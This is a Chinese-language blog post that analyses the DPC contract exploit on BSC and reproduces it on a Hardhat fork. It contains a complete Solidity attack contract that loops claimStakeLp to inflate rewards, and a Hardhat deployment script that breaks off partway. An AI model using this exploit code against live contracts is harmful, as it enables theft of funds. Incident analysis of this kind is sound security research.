@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+    <!--Description-->
+
+    
+
+    
+        <meta name="description" content="简述部署在bsc链上的DPC智能合约由于计算奖励部分逻辑错误被攻击者恶意利用，损失7w$。
+分析攻击者钱包地址：
+0xf211Fa86CBc60d693D687075B03dFF3c225b25C9
+攻击合约地址：
+0x2109bbecB0a563e204985524Dd3DB2F6254AB419"/>
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="d1rrick"/>
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="dpc攻击事件分析与复现"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="简述部署在bsc链上的DPC智能合约由于计算奖励部分逻辑错误被攻击者恶意利用，损失7w$。
+分析攻击者钱包地址：
+0xf211Fa86CBc60d693D687075B03dFF3c225b25C9
+攻击合约地址：
+0x2109bbecB0a563e204985524Dd3DB2F6254AB419"/>
+    
+
+    <!--Open Graph Site Name-->
+        <meta property="og:site_name" content="d1rrick&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article"/>
+    
+
+    <!--Page Cover-->
+    
+    
+        <meta property="og:image" content="http://example.comimg/home-bg.jpg"/>
+    
+
+        <meta name="twitter:card" content="summary_large_image"/>
+
+    
+
+    
+        <meta name="twitter:image" content="http://example.comimg/home-bg.jpg"/>
+    
+
+    <!-- Title -->
+    
+    <title>dpc攻击事件分析与复现 - d1rrick&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet"/>
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Configurable Title</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/">
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/archives">
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a target="_blank" rel="noopener" href="https://github.com/HiT0on">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/home-bg.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>dpc攻击事件分析与复现</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2022-09-18
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+                <div class="col-lg-4 col-lg-offset-2 col-md-5 col-md-offset-1 post-tags">
+                    
+                        
+
+
+<a href="/tags/区块链安全/">#区块链安全</a>
+
+
+                    
+                </div>
+                <div class="col-lg-4 col-md-5 post-categories">
+                    
+                </div>
+            
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><p>部署在bsc链上的DPC智能合约由于计算奖励部分逻辑错误被攻击者恶意利用，损失7w$。</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>攻击者钱包地址：</p>
+<p>0xf211Fa86CBc60d693D687075B03dFF3c225b25C9</p>
+<p>攻击合约地址：</p>
+<p>0x2109bbecB0a563e204985524Dd3DB2F6254AB419</p>
+<p>被攻击合约地址：</p>
+<p>0xb75ca3c3e99747d0e2f6e75a9fbd17f5ac03cebe</p>
+<p>攻击hash:</p>
+<p>1、转账至攻击合约</p>
+<p><a target="_blank" rel="noopener" href="https://bscscan.com/tx/0x9cfa3425bfb38eee34cc395b621df4b1b909b560af43c08048b1a8acb094d4a1">https://bscscan.com/tx/0x9cfa3425bfb38eee34cc395b621df4b1b909b560af43c08048b1a8acb094d4a1</a></p>
+<p>2、调用受害合约tokenAirdrop（为了满足最后的claim 的条件）</p>
+<p><a target="_blank" rel="noopener" href="https://bscscan.com/tx/0x4d9a4b90c0916e547b86dc3df52aeffede0a8b6d59ac16febc50babeef943f15">https://bscscan.com/tx/0x4d9a4b90c0916e547b86dc3df52aeffede0a8b6d59ac16febc50babeef943f15</a></p>
+<p>3、准备资金 质押</p>
+<p><a target="_blank" rel="noopener" href="https://bscscan.com/tx/0x0a9158bd93e505c019d687ea64a2f2a9032178ee07dd3f23783bb7a8a5f2ce1c">https://bscscan.com/tx/0x0a9158bd93e505c019d687ea64a2f2a9032178ee07dd3f23783bb7a8a5f2ce1c</a></p>
+<p>4、利用漏洞不断claim 使奖励累加</p>
+<p><a target="_blank" rel="noopener" href="https://bscscan.com/tx/0xe4c0ce1b77a4fcd49d29720953454561eb43f27635cc9f7a5e2df9c697347a62">https://bscscan.com/tx/0xe4c0ce1b77a4fcd49d29720953454561eb43f27635cc9f7a5e2df9c697347a62</a></p>
+<p>5、领取奖励 获利离场</p>
+<p><a target="_blank" rel="noopener" href="https://bscscan.com/tx/0x92cab23d536d2e13ecb7c473350121165de0ae6c6c81be94ba502ac7db72e86f">https://bscscan.com/tx/0x92cab23d536d2e13ecb7c473350121165de0ae6c6c81be94ba502ac7db72e86f</a></p>
+<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞原因出在claimStakeLp 函数，在计算奖励的时候claimStakeLp会去调用getClaimQuota函数，将获取到的结果加上原来的记录值</p>
+<p><img src="/img/postimg/dpc/image-20220918154729101.png" alt="image-20220918154729101"></p>
+<p>而getClaimQuota函数已经加上了原来的奖励，这就导致只要不断的调用claimStakeLp()，奖励会一直累加从而变成一个较大值</p>
+<p><img src="/img/postimg/dpc/image-20220918154835355.png" alt="image-20220918154835355"></p>
+<p>从攻击者的hash分析，第一次claim 的时候306995598970176 </p>
+<p><img src="/img/postimg/dpc/image-20220918155924160.png" alt="image-20220918155924160"></p>
+<p>第二次已经变成了613991197940352</p>
+<p><img src="/img/postimg/dpc/image-20220918160031713.png" alt="image-20220918160031713"></p>
+<p>不停累加最后变成一个较大的值</p>
+<p><img src="/img/postimg/dpc/image-20220918160140571.png" alt="image-20220918160140571"></p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用hardhat fork bsc 21179209区块</p>
+<h5 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;hardhat/console.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IERC20</span>&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">totalSupply</span>(<span class="params"></span>) external view returns (uint256);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address account</span>) external view returns (uint256);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address recipient, uint256 amount</span>) external ;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">allowance</span>(<span class="params">address owner, address spender</span>) external view returns (uint256);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint256 amount</span>) external;<span class="comment">// returns (bool);</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address sender, address recipient, uint256 amount</span>) external returns (bool);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">decimals</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IPancakeRouter</span> &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">addLiquidity</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address tokenA,</span></span><br><span class="line"><span class="params">    address tokenB,</span></span><br><span class="line"><span class="params">    uint256 amountADesired,</span></span><br><span class="line"><span class="params">    uint256 amountBDesired,</span></span><br><span class="line"><span class="params">    uint256 amountAMin,</span></span><br><span class="line"><span class="params">    uint256 amountBMin,</span></span><br><span class="line"><span class="params">    address to,</span></span><br><span class="line"><span class="params">    uint256 deadline</span></span><br><span class="line"><span class="params">  </span>)</span><br><span class="line">  external</span><br><span class="line">  returns (</span><br><span class="line">    uint256 amountA,</span><br><span class="line">    uint256 amountB,</span><br><span class="line">    uint256 liquidity</span><br><span class="line">  );</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">swapExactTokensForTokens</span>(<span class="params"></span></span><br><span class="line"><span class="params">    uint256 amountIn,</span></span><br><span class="line"><span class="params">    uint256 amountOutMin,</span></span><br><span class="line"><span class="params">    address[] memory path,</span></span><br><span class="line"><span class="params">    address to,</span></span><br><span class="line"><span class="params">    uint256 deadline</span></span><br><span class="line"><span class="params">    </span>) external returns (uint256[] memory amounts);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">swapExactTokensForTokensSupportingFeeOnTransferTokens</span>(<span class="params"></span></span><br><span class="line"><span class="params">    uint256 amountIn,</span></span><br><span class="line"><span class="params">    uint256 amountOutMin,</span></span><br><span class="line"><span class="params">    address[] memory path,</span></span><br><span class="line"><span class="params">    address to,</span></span><br><span class="line"><span class="params">    uint256 deadline</span></span><br><span class="line"><span class="params">  </span>) external;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">swapExactETHForTokens</span>(<span class="params"></span></span><br><span class="line"><span class="params">    uint256 amountOutMin,</span></span><br><span class="line"><span class="params">    address[] memory path,</span></span><br><span class="line"><span class="params">    address to,</span></span><br><span class="line"><span class="params">    uint256 deadline</span></span><br><span class="line"><span class="params">  </span>) external payable returns (uint256[] memory amounts);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface <span class="variable constant_">IDPC</span>&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address, uint256</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address</span>) external returns (uint256);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tokenAirdrop</span>(<span class="params">address, address, uint</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">stakeLp</span>(<span class="params">address, address, uint256</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">claimStakeLp</span>(<span class="params">address, uint256</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">claimDpcAirdrop</span>(<span class="params">address</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IPair</span>&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address, uint256</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address</span>) external returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    <span class="title class_">IERC20</span> <span class="variable constant_">USDT</span> = <span class="title class_">IERC20</span>(<span class="number">0x55d398326f99059fF775485246999027B3197955</span>);</span><br><span class="line">    <span class="title class_">IERC20</span> <span class="variable constant_">WBNB</span> = <span class="title class_">IERC20</span>(<span class="number">0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c</span>);</span><br><span class="line">    <span class="variable constant_">IDPC</span> <span class="variable constant_">DPC</span> = <span class="title function_">IDPC</span>(<span class="number">0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE</span>);</span><br><span class="line">    <span class="title class_">IPair</span> <span class="title class_">Pair</span> = <span class="title class_">IPair</span>(<span class="number">0x79cD24Ed4524373aF6e047556018b1440CF04be3</span>);</span><br><span class="line">    <span class="title class_">IPancakeRouter</span> router = <span class="title class_">IPancakeRouter</span>(<span class="title function_">payable</span>(<span class="number">0x10ED43C718714eb63d5aA57B78B54704E256024E</span>));</span><br><span class="line">    address attacker = <span class="number">0xf211Fa86CBc60d693D687075B03dFF3c225b25C9</span>;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approveall</span>(<span class="params"></span>) public payable&#123;</span><br><span class="line">        <span class="variable constant_">USDT</span>.<span class="title function_">approve</span>(<span class="title function_">address</span>(router), <span class="title function_">type</span>(uint).<span class="property">max</span>);</span><br><span class="line">        <span class="variable constant_">DPC</span>.<span class="title function_">approve</span>(<span class="title function_">address</span>(router), <span class="title function_">type</span>(uint).<span class="property">max</span>);</span><br><span class="line">        <span class="title class_">Pair</span>.<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="variable constant_">DPC</span>),<span class="title function_">type</span>(uint).<span class="property">max</span>);</span><br><span class="line">        <span class="variable constant_">USDT</span>.<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="variable constant_">DPC</span>),<span class="title function_">type</span>(uint).<span class="property">max</span>);</span><br><span class="line">        <span class="variable constant_">WBNB</span>.<span class="title function_">approve</span>(<span class="title function_">address</span>(router), <span class="title function_">type</span>(uint).<span class="property">max</span>); </span><br><span class="line">        <span class="title function_">address</span>(<span class="variable constant_">WBNB</span>).<span class="property">call</span>&#123;<span class="attr">value</span>:msg.<span class="property">value</span>&#125;(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)&#123;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner&#123;</span><br><span class="line">        <span class="built_in">require</span>(owner == msg.<span class="property">sender</span>,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//swap wbnb to usdt</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">swapBnbToUsdt</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        address[] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = <span class="title function_">address</span>(<span class="variable constant_">WBNB</span>);</span><br><span class="line">        path[<span class="number">1</span>] = <span class="title function_">address</span>(<span class="variable constant_">USDT</span>);</span><br><span class="line">        router.<span class="title function_">swapExactTokensForTokensSupportingFeeOnTransferTokens</span>(</span><br><span class="line">            <span class="variable constant_">WBNB</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            path,</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">            block.<span class="property">timestamp</span>+<span class="number">1000</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">swapUsdtToDpc</span>(<span class="params"></span>)public &#123;</span><br><span class="line">        address[] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = <span class="title function_">address</span>(<span class="variable constant_">USDT</span>);</span><br><span class="line">        path[<span class="number">1</span>] = <span class="title function_">address</span>(<span class="variable constant_">DPC</span>);</span><br><span class="line">        router.<span class="title function_">swapExactTokensForTokens</span>(</span><br><span class="line">            <span class="variable constant_">USDT</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)) / <span class="number">2</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            path,</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">            block.<span class="property">timestamp</span> + <span class="number">1000</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addliquidity</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        router.<span class="title function_">addLiquidity</span>(</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable constant_">USDT</span>),</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable constant_">DPC</span>),</span><br><span class="line">            <span class="variable constant_">USDT</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)),</span><br><span class="line">            <span class="variable constant_">DPC</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">            block.<span class="property">timestamp</span>+<span class="number">1000</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">stakelp</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="variable constant_">DPC</span>.<span class="title function_">stakeLp</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="title function_">address</span>(<span class="variable constant_">DPC</span>), <span class="title class_">Pair</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tokenairdrop</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        <span class="variable constant_">DPC</span>.<span class="title function_">tokenAirdrop</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="title function_">address</span>(<span class="variable constant_">DPC</span>), <span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">DPCToWBNB</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        address[] memory path = <span class="keyword">new</span> address[](<span class="number">3</span>);</span><br><span class="line">        path[<span class="number">0</span>] = <span class="title function_">address</span>(<span class="variable constant_">DPC</span>);</span><br><span class="line">        path[<span class="number">1</span>] = <span class="title function_">address</span>(<span class="variable constant_">USDT</span>);</span><br><span class="line">        path[<span class="number">2</span>] = <span class="title function_">address</span>(<span class="variable constant_">WBNB</span>);</span><br><span class="line">        router.<span class="title function_">swapExactTokensForTokensSupportingFeeOnTransferTokens</span>(</span><br><span class="line">            <span class="variable constant_">DPC</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            path,</span><br><span class="line">            <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">            block.<span class="property">timestamp</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) external &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(uint i=<span class="number">0</span>;i&lt;=<span class="number">15</span>;i++)&#123;</span><br><span class="line">            <span class="variable constant_">DPC</span>.<span class="title function_">claimStakeLp</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>),<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable constant_">DPC</span>.<span class="title function_">claimDpcAirdrop</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="title class_">DPCToWBNB</span>();</span><br><span class="line">        <span class="comment">// console.log(WBNB.balanceOf(address(this)));</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="攻击脚本"><a href="#攻击脚本" class="headerlink" title="攻击脚本"></a>攻击脚本</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hre = <span class="built_in">require</span>(<span class="string">&#x27;hardhat&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> hacker = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> wbnb = <span class="string">&#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> usdt = <span class="string">&#x27;0x55d398326f99059fF775485246999027B3197955&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> dpc = <span class="string">&#x27;0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> pair = <span class="string">&#x27;0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> hre.<span class="property">network</span>.<span class="property">provider</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&quot;hardhat_impersonateAccount&quot;</span>,</span><br><span class="line">        <span class="attr">params</span>: [hacker]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> signer = <span class="keyword">await</span> hre.<span class="property">ethers</span>.<span class="title function_">getSigner</span>(hacker)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//step1 depoly contract</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable constant_">ATTACK</span> = <span class="keyword">await</span> hre.<span class="property">ethers</span>.<span class="title function_">getContractFactory</span>(<span class="string">&quot;hack&quot;</span>, signer)</span><br><span class="line">    <span class="keyword">let</span> attack = <span class="keyword">await</span> <span class="variable constant_">ATTACK</span>.<span class="title function_">deploy</span>()</span><br><span class="line">    <span class="keyword">await</span> attack.<span class="title function_">deployed</span>()</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;attack contrack deployed address is:&quot;</span>, attack.<span class="property">address</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> wbnbContract = <span class="keyword">await</span> hre.<span class="property">ethers</span>.<span class="title function_">getContractAt</span>(<span 